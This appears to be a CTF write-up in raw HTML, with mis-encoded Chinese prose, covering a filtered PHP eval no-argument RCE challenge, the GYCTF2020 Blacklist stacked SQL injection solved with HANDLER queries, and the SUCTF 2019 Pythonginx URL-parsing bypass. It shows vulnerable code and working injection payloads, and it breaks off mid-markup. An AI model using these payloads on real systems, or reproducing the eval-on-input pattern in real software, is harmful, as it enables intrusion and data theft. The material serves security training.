&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ &amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt; === preg_replace(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/[a-z,_]+\((?R)?\)/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (!preg_match(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-comment&#34;&gt;// echo $_GET[&amp;#x27;exp&amp;#x27;];&lt;/span&gt;&lt;br&gt;                @&lt;span class=&#34;hljs-keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]);&lt;br&gt;            &amp;#125;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;                &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;            &amp;#125;&lt;br&gt;        &amp;#125;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;å†å¥½å¥½æƒ³æƒ³ï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;        &amp;#125;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&amp;quot;&lt;/span&gt;);&lt;br&gt;    &amp;#125;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// highlight_file(__FILE__);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ— å‚æ•° RCEï¼ˆ&lt;a href=&#34;https://xz.aliyun.com/t/6316%EF%BC%89&#34;&gt;https://xz.aliyun.com/t/6316ï¼‰&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸€äº›å¸¸è§å‡½æ•°ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getchwd&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;scandir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;dirname&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chdir&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;readfile&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;  è¾“å‡ºä¸€ä¸ªæ–‡ä»¶&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;current&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       è¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒ, é»˜è®¤å–ç¬¬ä¸€ä¸ªå€¼&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;pos&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;           current() çš„åˆ«å&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;       å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_rand&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array_flip&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;chr&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt; å‡½æ•°ä»æŒ‡å®šçš„ ASCII å€¼è¿”å›å­—ç¬¦ã€‚&lt;br&gt;hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;getenv&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;        è·å–ä¸€ä¸ªç¯å¢ƒå˜é‡çš„å€¼(åœ¨&lt;span class=&#34;hljs-number&#34;&gt;7.1&lt;/span&gt;ä¹‹åå¯ä»¥ä¸ç»™äºˆå‚æ•°)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;gyctf2020blacklist&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gyctf2020blacklist&#34;&gt;#&lt;/a&gt; [GYCTF2020]Blacklist&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;preg_match(&amp;quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|./i&amp;quot;,$inject);&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬ä¸€çœ¼çœ‹é¢˜ç›®åƒå¼ºç½‘æ¯éšä¾¿æ³¨ï¼ŒåŒæ ·æµ‹è¯•å †å æ³¨å…¥&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show tables;&lt;/code&gt; =&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight stylus&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stylus&#34;&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;FlagHere&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt; &amp;#123;&lt;br&gt;  &lt;span class=&#34;hljs-selector-attr&#34;&gt;[0]&lt;/span&gt;=&amp;gt;&lt;br&gt;  string(&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;words&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;1&#39;;show columns from FlagHere;&lt;/code&gt; =&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight sml&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs sml&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;) &amp;#123;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;flag&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;12&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;varchar(100)&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;NO&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-type&#34;&gt;NULL&lt;/span&gt;&lt;br&gt;  [&lt;span class=&#34;hljs-number&#34;&gt;5&lt;/span&gt;]=&amp;gt;&lt;br&gt;  &lt;span class=&#34;hljs-built_in&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;HANDLER â€¦ OPEN è¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åç»­ HANDLER â€¦ READ è¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨ HANDLER â€¦ CLOSE æˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­&lt;/p&gt;
&lt;p&gt;&lt;code&gt;1&#39;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;suctf-2019pythonginx&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#suctf-2019pythonginx&#34;&gt;#&lt;/a&gt; [SUCTF 2019]Pythonginx&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight css&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs css&#34;&gt;def getUrl():&lt;br&gt;    url = request.args.&lt;span class=&#34;hljs-built_in&#34;&gt;get&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;url&amp;quot;&lt;/span&gt;)&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(url).hostname&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 111&amp;quot;&lt;/span&gt;&lt;br&gt;    parts = &lt;span class=&#34;hljs-built_in&#34;&gt;list&lt;/span&gt;(&lt;span class=&#34;hljs-built_in&#34;&gt;urlsplit&lt;/span&gt;(url))&lt;br&gt;    host = parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 222 &amp;quot;&lt;/span&gt; + host&lt;br&gt;    newhost = []&lt;br&gt;    for h in host.&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;):&lt;br&gt;        newhost.&lt;span class=&#34;hljs-built_in&#34;&gt;append&lt;/span&gt;(h.&lt;span class=&#34;hljs-built_in&#34;&gt;encode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;idna&amp;#x27;&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;decode&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;))&lt;br&gt;    parts[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;.&lt;span class=&#34;hljs-built_in&#34;&gt;join&lt;/span&gt;(newhost)&lt;br&gt;    #å»æ‰ url ä¸­çš„ç©ºæ ¼&lt;br&gt;    finalUrl = &lt;span class=&#34;hljs-built_in&#34;&gt;urlunsplit&lt;/span&gt;(parts).&lt;span class=&#34;hljs-built_in&#34;&gt;split&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;]&lt;br&gt;    host = parse.&lt;span class=&#34;hljs-built_in&#34;&gt;urlparse&lt;/span&gt;(finalUrl).hostname&lt;br&gt;    if host == &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;suctf.cc&amp;#x27;&lt;/span&gt;:&lt;br&gt;        return urllib.request.&lt;span class=&#34;hljs-built_in&#34;&gt;urlopen&lt;/span&gt;(finalUrl, timeout=&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;).&lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt;()&lt;br&gt;    else:&lt;br&gt;        return &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;æˆ‘æ‰Œ your problem? 333&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬ä¸€å±‚ï¼Œå½“ &lt;code&gt;//&lt;/code&gt;  æ²¡æœ‰æ­£ç¡®å¼•å…¥æ—¶ hostname å°±æ— æ³•æ­£ç¡®åŒ¹é…åˆ°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦ &lt;code&gt;////&lt;/code&gt;  å³å¯ç»•è¿‡ç¬¬ä¸€å±‚&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç¬¬äºŒã€ä¸‰å±‚å’Œç¬¬ä¸€å±‚ä¸€æ ·ï¼Œä¹Ÿç»•è¿‡äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Nginx é‡è¦æ–‡ä»¶ä½ç½®&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 